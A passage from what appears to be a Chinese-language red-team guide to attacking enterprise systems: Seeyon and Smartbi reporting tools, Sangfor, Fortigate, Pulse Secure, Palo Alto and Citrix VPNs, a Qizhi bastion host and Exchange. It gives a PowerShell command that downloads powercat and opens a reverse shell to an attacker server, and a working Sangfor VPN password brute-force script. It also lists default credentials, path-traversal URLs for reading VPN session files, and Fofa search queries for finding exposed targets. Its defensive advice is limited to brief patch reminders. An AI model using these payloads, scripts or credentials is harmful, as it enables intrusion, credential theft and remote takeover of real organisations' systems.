rt.exec(commands); pc.waitFor(); &#125;    public static void main(String[] argv) throws IOException, InterruptedException &#123;        LocaleFinder e = new LocaleFinder(); &#125;&#125;</code></pre><p>复制LocaleFinder.class到</p><pre><code>\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\</code></pre><p>进入到插件管理界面, 上传符合规范的jar包插件即可<br>没生效就访问一下 <a href="https://xxxx/seeyonreport/ReportServer?op=im">https://xxxx/seeyonreport/ReportServer?op=im</a></p><p>一般后台都是win, 可以直接使用powershell进行反弹shell</p><pre><code>powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c vps_ip -p 6666 -e cmd</code></pre><ol start="8"><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>使用waf拦截</p><h1 id="Smartbi-前台SQL注入"><a href="#Smartbi-前台SQL注入" class="headerlink" title="Smartbi 前台SQL注入"></a>Smartbi 前台SQL注入</h1></li><li><p>漏洞简介<br>Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.</p></li><li><p>影响组件<br>Smartbi</p></li><li><p>漏洞指纹<br>SmartBi</p></li><li><p>Fofa Dork<br>app=”Smartbi”</p></li><li><p>漏洞分析<br>Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）<br><a href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ">https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a><br>漏洞文件<br>vision/userListManager.jsp</p></li></ol><p>function doDel(){<br>    var ids = [];<br>       // 全选漏洞文件<br>vision/userListManager.jsp</p><pre><code>function doDel()&#123;   var ids = [];   // 全选   if($(&quot;#checkAll&quot;).checked)&#123;      if(curRows)&#123;         curRows.forEach(function(val, index)&#123;            ids.push(val.id);         &#125;);      &#125;   &#125;else&#123;      if(curRows)&#123;         $(&quot;[name=&#39;checkTr&#39;]&quot;).each(function()&#123;            if(this.checked)&#123;               ids.push(this.id);            &#125;         &#125;);      &#125;   &#125;   if(ids &amp;&amp; ids.length &gt; 0)&#123;      if(!canOpt())&#123;         alert(&quot;&lt;%=StringUtil.getLanguageValue(&quot;Youdonothavepermissiontodoso&quot;)%&gt;&quot;);         return;      &#125;      var msg = &quot;&lt;%=StringUtil.getLanguageValue(&quot;Suredelete?&quot;)%&gt;&quot;;      var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;      alert(msg, &quot;&lt;%=StringUtil.getLanguageValue(&quot;Removetips&quot;)%&gt;&quot;, flags, function(ret) &#123;         if (ret == modalWindow.ID_YES) &#123;            var ret = jsloader.resolve(&quot;freequery.common.util&quot;).remoteInvokeEx2(&quot;BIConfigService&quot;, &quot;delUsers&quot;, [ids]);            if(ret &amp;&amp; ret.result == 1)&#123;               alert(&quot;&lt;%=StringUtil.getLanguageValue(&quot;Deletedsuccessfully&quot;)%&gt;&quot;);               refresh();            &#125;         &#125;      &#125;, this);   &#125;else&#123;      alert(&quot;&lt;%=StringUtil.getLanguageValue(&quot;Noselectedobjectyouwanttodelete&quot;)%&gt;&quot;);   &#125;&#125;</code></pre><p>smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class</p><pre><code>public int delUsers(List&lt;String&gt; ids) &#123;    boolean succ = true;    String idStr = &quot;&quot;;    if (ids != null &amp;&amp; ids.size() &gt; 0) &#123;        for(int i = 0; i &lt; ids.size(); ++i) &#123;            if (i == 0) &#123;                idStr = &quot;(&#39;&quot; + (String)ids.get(i) + &quot;&#39;&quot;;            &#125; else &#123;                idStr = idStr + &quot;, &quot; + &quot;&#39;&quot; + (String)ids.get(i) + &quot;&#39;&quot;;            &#125;        &#125;        idStr = idStr + &quot;)&quot;;        Connection conn = null;        PreparedStatement prep = null;        Object rs = null;        try &#123;            conn = DbUtil.getRepoConnection();            conn.setAutoCommit(false);            String sqlUser = &quot;delete from t_user where c_userid in &quot; + idStr;            String sqlUserAttr = &quot;delete from t_userattr where c_userid in &quot; + idStr;            String sqlUserconfig = &quot;delete from t_userconfig where c_userid in &quot; + idStr;            String sqlUserRole = &quot;delete from t_user_role where c_userid in &quot; + idStr;            String sqlUserGroup = &quot;delete from t_group_user where c_userid in &quot; + idStr;            prep = conn.prepareStatement(sqlUser);            prep.execute();            prep = conn.prepareStatement(sqlUserAttr);            prep.execute();            prep = conn.prepareStatement(sqlUserconfig);            prep.execute();            prep = conn.prepareStatement(sqlUserRole);            prep.execute();            prep = conn.prepareStatement(sqlUserGroup);            prep.execute();            conn.commit();        &#125; catch (Exception var17) &#123;            try &#123;                succ = false;                conn.rollback();            &#125; catch (SQLException var16) &#123;                throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);            &#125;            throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);        &#125; finally &#123;            DbUtil.closeDBObject((ResultSet)rs, prep, conn);        &#125;        return succ ? 1 : 0;    &#125; else &#123;        return 1;    &#125;&#125;       if($(&quot;#checkAll&quot;).checked)&#123;          if(curRows)&#123;             curRows.forEach(function(val, index)&#123;                ids.push(val.id);             &#125;);          &#125;       &#125;else&#123;          if(curRows)&#123;             $(&quot;[name=&#39;checkTr&#39;]&quot;).each(function()&#123;                if(this.checked)&#123;                   ids.push(this.id);                &#125;             &#125;);          &#125;       &#125;       if(ids &amp;&amp; ids.length &gt; 0)&#123;          if(!canOpt())&#123;             alert(&quot;&lt;%=StringUtil.getLanguageValue(&quot;Youdonothavepermissiontodoso&quot;)%&gt;&quot;);             return;          &#125;          var msg = &quot;&lt;%=StringUtil.getLanguageValue(&quot;Suredelete?&quot;)%&gt;&quot;;          var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;          alert(msg, &quot;&lt;%=StringUtil.getLanguageValue(&quot;Removetips&quot;)%&gt;&quot;, flags, function(ret) &#123;             if (ret == modalWindow.ID_YES) &#123;                var ret = jsloader.resolve(&quot;freequery.common.util&quot;).remoteInvokeEx2(&quot;BIConfigService&quot;, &quot;delUsers&quot;, [ids]);                if(ret &amp;&amp; ret.result == 1)&#123;                   alert(&quot;&lt;%=StringUtil.getLanguageValue(&quot;Deletedsuccessfully&quot;)%&gt;&quot;);                   refresh();                &#125;             &#125;          &#125;, this);       &#125;else&#123;          alert(&quot;&lt;%=StringUtil.getLanguageValue(&quot;Noselectedobjectyouwanttodelete&quot;)%&gt;&quot;);       &#125;    &#125;</code></pre><ol start="6"><li><p>漏洞利用<br>这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了</p></li><li><p>利用技巧</p></li><li><p>RMIServlet加解密代码<br>虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码</p><pre><code> ENCODING_SCHEDULE = &#123;      &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;&#39;&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;,       &quot;%&quot;: &quot;/&quot;, &quot;&#39;&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;,       &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;,       &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;,       &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;,       &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;,       &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;,   &#125; DECODING_SCHEDULE = &#123;      &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;&#39;&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;,       &quot;/&quot;: &quot;%&quot;, &quot;n&quot;: &quot;&#39;&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;,       &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;,       &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;,       &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;,       &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;,       &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;,  &#125; #此函数可以用来加密明文也可以解密服务器返回的密文 def encode(code):     out = &quot;&quot;     for item in code:         out = out + ENCODING_SCHEDULE.get(item, item)     return out def decode(code):     out = &quot;&quot;     for item in code:         out = out + DECODING_SCHEDULE.get(item, item)     return out</code></pre></li></ol><p>2.该系统还有几处漏洞, 比如默认口令</p><pre><code>demo/demomanager/demoadmin/adminadmin/manageradmin/2manager</code></pre><p>3.默认路径<br><a href="http://127.0.0.1:18080/smartbi/vision/config.jsp">http://127.0.0.1:18080/smartbi/vision/config.jsp</a> 可能未修改密码或者密码为manager<br>4.进入后台目录遍历<br><a href="http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=C:/">http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=C%3A%2F</a><br>同样是后台可以加载插件, 怎么getshell不用我多说了吧<br>8. 防护方法<br>1.及时更新补丁<br>2.使用强口令<br>3.版本最好为最新版8.5以上, v7还有其他漏洞</p><h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><p>本节主要是针对网络边界产品, VPN, 防火墙, 邮箱一类的相关漏洞, 属于典型灯下黑的情况, 厂商可能会忘记, 但是攻击者不会放过一丝一毫</p><h1 id="深信服VPN远程代码执行"><a href="#深信服VPN远程代码执行" class="headerlink" title="深信服VPN远程代码执行"></a>深信服VPN远程代码执行</h1><ol><li><p>漏洞简介<br>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p></li><li><p>影响组件<br>深信服 VPN</p></li><li><p>漏洞指纹<br>Set-Cookie: TWFID=<br>welcome to ssl vpn<br>Sinfor</p></li><li><p>Fofa Dork<br>header=”Set-Cookie: TWFID=”</p></li><li><p>漏洞分析<br>深信服vpnweb登录逆向学习 – potatso – 博客园<br><a href="https://www.cnblogs.com/potatsoSec/p/12326356.html">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p></li><li><p>漏洞利用</p><p> wget -t %d -T %d –spider %s<br> 分析一下上面文章就ok, 比较简单的命令注入</p></li><li><p>利用技巧</p></li><li><p>该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网</p></li><li><p>该版本较低, whomai不存在, 可以使用 uname, 这里没有空格可dns传出来</p></li><li><p>去除空格也简单 cat /etc/passwd | tr “ \n” “+|”</p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h1></li><li><p>漏洞简介<br>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p></li><li><p>影响组件<br>深信服 VPN</p></li><li><p>漏洞指纹<br>/por/login_auth.csp?apiversion=1<br>sangfor<br>/cgi-bin/login.cgi?rnd=</p></li><li><p>Fofa Dork<br>app=”深信服-SSL-VPN”</p></li><li><p>漏洞分析<br>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a><br>此处存疑, 时间问题没有测试</p></li><li><p>漏洞利用</p></li><li><p>深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)</p><pre><code>  #encoding=utf8  import requests  import hashlib  import urllib3  urllib3.disable_warnings()  import re  session = requests.session()  def SanForLogin(target, password, username=&quot;admin&quot;):      burp0_url = target +&quot;/cgi-bin/login.cgi?rnd=&quot;      burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&quot;&#125;      r1 = session.get(burp0_url, verify=False)      sid = r1.cookies[&quot;sinfor_session_id&quot;]      Epassword = hashlib.sha1(password+sid).hexdigest()      burp0_data = &#123;&quot;user&quot;: username, &quot;password&quot;: Epassword, &quot;logintime&quot;: &quot;2&quot;, &quot;program&quot;: &quot;3&quot;, &quot;language&quot;: &quot;zh_CN&quot;&#125;      r2 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)      r2.encoding=&quot;UTF-8&quot;      if r2.status_code==200 and &quot;&lt;TITLE&gt;Loading...&lt;/TITLE&gt;&quot; in r2.text:          print(&quot;Success! admin password is &quot;, password)          print(r2.cookies[&quot;sinfor_session_id&quot;])          return password      else:          for x in re.findall(&quot;var loginInfo = \&quot;.*?\&quot;&quot;, r2.text):              print(x)              if &quot;IP&quot; in x:                  print(&quot;IP lock wait for 5 mins&quot;)                  time.sleep(305)</code></pre></li></ol><pre><code>    SanForLogin(&quot;https://xxxxxxxxxxx/&quot;, &quot;admin&quot;)</code></pre><ol start="7"><li><p>利用技巧</p></li><li><p>由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多<br>国外APT组织应该也批量爆破了一波<br>加密的密码也就是 sha1(password+sid)<br>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些<br>admin/123456/Sangfor/Sangfor@123</p></li><li><p>如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p></li><li><p>去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧<br>深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全<br><a href="https://www.uedbox.com/post/31092/">https://www.uedbox.com/post/31092/</a></p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="Fortigate-SSL-VPN-文件读取-远程代码执行"><a href="#Fortigate-SSL-VPN-文件读取-远程代码执行" class="headerlink" title="Fortigate SSL VPN 文件读取/远程代码执行"></a>Fortigate SSL VPN 文件读取/远程代码执行</h1></li><li><p>漏洞简介<br>Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞</p></li><li><p>影响组件<br>Fortigate SSL VPN</p></li><li><p>漏洞指纹<br>Fortigate<br>4tinet2095866</p></li><li><p>Fofa Dork<br>“Fortigate” &amp;&amp; port=10443</p></li><li><p>漏洞分析<br>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN<br><a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1">https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p></li><li><p>漏洞利用<br>密码读取<br>milo2012/CVE-2018-13379: CVE-2018-13379<br><a href="https://github.com/milo2012/CVE-2018-13379">https://github.com/milo2012/CVE-2018-13379</a><br>任意密码重置, 这肯定是个后门<br>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382">https://github.com/milo2012/CVE-2018-13382</a></p></li><li><p>利用技巧</p></li><li><p>文件读取的路径构造<br><a href="https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession">https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</a><br>如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd<br>print(“/../../../../“+(raw_input().rjust(35, ‘/‘)))</p></li><li><p>寻找魔术数字<br>虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,<br><a href="https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd">https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd</a><br>后来发现这个字符串在js里面也有, 直接从前台分析也可以获得<br><a href="https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2">https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2</a></p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="Pulse-Secure-SSL-VPN远程代码执行漏洞"><a href="#Pulse-Secure-SSL-VPN远程代码执行漏洞" class="headerlink" title="Pulse Secure SSL VPN远程代码执行漏洞"></a>Pulse Secure SSL VPN远程代码执行漏洞</h1></li><li><p>漏洞简介<br>Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p></li><li><p>影响组件<br>Pulse Secure SSL VPN</p></li><li><p>漏洞指纹<br>Pulse Secure SSL VPN</p></li><li><p>Fofa Dork<br>app=”PulseSecure-SSL-VPN”</p></li><li><p>漏洞分析<br>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/185773">https://www.anquanke.com/post/id/185773</a></p></li><li><p>漏洞利用<br>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)<br><a href="https://github.com/projectzeroindia/CVE-2019-11510">https://github.com/projectzeroindia/CVE-2019-11510</a><br>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect<br><a href="https://github.com/0xDezzy/CVE-2019-11539">https://github.com/0xDezzy/CVE-2019-11539</a></p></li><li><p>利用技巧</p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="Palo-Alto-GlobalProtect-VPN远程代码执行漏洞"><a href="#Palo-Alto-GlobalProtect-VPN远程代码执行漏洞" class="headerlink" title="Palo Alto GlobalProtect VPN远程代码执行漏洞"></a>Palo Alto GlobalProtect VPN远程代码执行漏洞</h1></li><li><p>漏洞简介<br>Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p></li><li><p>影响组件<br>Palo Alto GlobalProtect</p></li><li><p>漏洞指纹<br>GlobalProtect Portal</p></li><li><p>Fofa Dork<br>app=”PaloAlto-GlobalProtect”</p></li><li><p>漏洞分析<br>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!<br><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a><br>Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园<br><a href="https://www.cnblogs.com/backlion/p/11209054.html">https://www.cnblogs.com/backlion/p/11209054.html</a></p></li><li><p>漏洞利用<br>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579">https://github.com/securifera/CVE-2019-1579</a></p></li><li><p>利用技巧</p></li><li><p>这个扫描的话可以判断<br>/global-protect/portal/css/login.css<br>/images/logo_pan_158.gif<br>Last-Modified 是否早于于2018年<br>curl -s -I <a href="https://sslvpn/global-protect/portal/css/login.css">https://sslvpn/global-protect/portal/css/login.css</a> | grep Last-Modified<br>Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT</p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781"><a href="#Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781" class="headerlink" title="Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)"></a>Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)</h1></li><li><p>漏洞简介<br>Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)</p></li><li><p>影响组件<br>Citrix Gateway/ADC</p></li><li><p>漏洞指纹<br>Citrix Gateway/ADC</p></li><li><p>Fofa Dork<br>app=”Citrix-Netscaler”</p></li><li><p>漏洞分析<br>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/news/232752.html">https://www.freebuf.com/news/232752.html</a></p></li><li><p>漏洞利用<br>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781">https://github.com/trustedsec/cve-2019-19781</a></p></li><li><p>利用技巧</p></li><li><p>通过以下命令可以快速断定<br>curl <a href="https://host/vpns/cfg/smb.conf">https://host/vpn/../vpns/cfg/smb.conf</a> –path-as-is –insecure<br>这里部分版本不需要进行../跳转也可以, 具体原因没有分析</p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p></li><li><p>暂时屏蔽未授权用户对/vpns/路径的访问</p><h1 id="齐治堡垒机相关漏洞"><a href="#齐治堡垒机相关漏洞" class="headerlink" title="齐治堡垒机相关漏洞"></a>齐治堡垒机相关漏洞</h1></li><li><p>漏洞简介<br>齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写</p></li><li><p>影响组件<br>齐治堡垒机</p></li><li><p>漏洞指纹<br>shterm</p></li><li><p>Fofa Dork<br>app=”shterm-堡垒机”</p></li><li><p>漏洞分析<br>审计某系统从解密到GetShell – 云+社区 – 腾讯云<br><a href="https://cloud.tencent.com/developer/article/1448700">https://cloud.tencent.com/developer/article/1448700</a><br>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb">http://kfbiji.com/article/65b98114903248eb</a></p></li><li><p>漏洞利用<br>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb">http://kfbiji.com/article/65b98114903248eb</a></p></li><li><p>利用技巧</p></li><li><p>齐治堡垒机默认口令:shterm/shterm</p></li><li><p>普通用户获取堡垒机权限, 登录之后可尝试命令注入<br>如果有类似chrome的应用可以直接使用ctrl+o打开窗口, 然后新建bat, 起一个cmd或者其他的程序</p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p></li><li><p>做好权限控制</p><h1 id="Exchange-相关漏洞"><a href="#Exchange-相关漏洞" class="headerlink" title="Exchange 相关漏洞"></a>Exchange 相关漏洞</h1></li><li><p>漏洞简介<br>Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)</p></li><li><p>影响组件<br>Exchange</p></li><li><p>漏洞指纹<br>Exchange<br>outlook</p></li><li><p>Fofa Dork<br>app=”Microsoft-Exchange”</p></li><li><p>漏洞分析<br>微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/195162.html">https://www.freebuf.com/vuls/195162.html</a><br>Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析<br><a href="https://paper.seebug.org/804/">https://paper.seebug.org/804/</a><br>微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区<br><a href="https://xz.aliyun.com/t/7299">https://xz.aliyun.com/t/7299</a></p></li><li><p>漏洞利用<br>Ridter/Exchange2domain: CVE-2018-8581<br><a href="https://github.com/Ridter/Exchange2domain">https://github.com/Ridter/Exchange2domain</a><br>Ridter/cve-2020-0688: cve-2020-0688<br><a href="https://github.com/Ridter/cve-2020-0688">https://github.com/Ridter/cve-2020-0688</a><br>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p></li><li><p>利用技巧</p></li><li><p>寻找企业的Exchange有个技巧<br>除了访问以下域名或者直接查找 DNS MX 记录</p><pre><code>  mail.domain.com  mail1.domain.com  mail-hk.domain.com  owa.domain.com  exchange.domain.com  email.domain.com  outlook.domain.com</code></pre></li></ol><p>还有个很好用的域名, 这是outlook的自动发现域名<br>autodiscover.domain.com<br>2.爆破Exchange<br>这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口<br>通常这里的密码能横穿内网, 比如 VPN, OA, SSO<br>Exchange通常有以下几个接口<br>/owa 前台web登录, 一般可以爆破<br>/ews 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破<br>/autodiscover/autodiscover.xml 自动发现接口, 同ews爆破<br>3.爆破工具可使用 owa用burp, ews用ruler, awvs(比较好用)<br>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a><br>4.弱口令爆破技巧, 爆破Exchange相对比较好用, 直接生成企业特色弱口令</p><pre><code>import itertoolsprefix = [&#39;baidu&#39;, &#39;Baidu&#39;]for x in 